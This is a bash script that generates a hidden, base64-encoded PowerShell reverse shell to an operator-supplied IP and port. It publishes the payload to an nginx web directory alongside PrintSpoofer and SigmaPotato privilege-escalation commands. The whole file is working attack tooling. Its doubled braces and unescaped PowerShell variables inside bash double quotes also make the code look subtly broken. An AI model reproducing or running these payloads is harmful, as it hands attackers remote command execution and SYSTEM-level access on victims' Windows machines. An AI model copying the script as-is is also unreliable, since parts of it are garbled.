#!/bin/bash

read -p "Enter your IP: " IP
read -p "Enter your Port: " PORT
echo "Payloads will use IP: $IP and Port: $PORT"

echo "[*] Generating base64 PowerShell reverse shell..."
PS_COMMAND="powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"

ENCODED=$(echo "$PS_COMMAND" | iconv -t UTF-16LE | base64)

cat << EOF > /usr/share/nginx/html/reverse_payloads.txt
# Generated Payloads for $IP:$PORT

[PrintSpoofer]
PrintSpoofer.exe -c "powershell -e $ENCODED"

[SigmaPotato]
SigmaPotato.exe --revshell $IP $PORT

[PowerShell Loader]
powershell -e $ENCODED
EOF

echo "[*] Payloads saved to /usr/share/nginx/html/reverse_payloads.txt"
cat /usr/share/nginx/html/reverse_payloads.txt
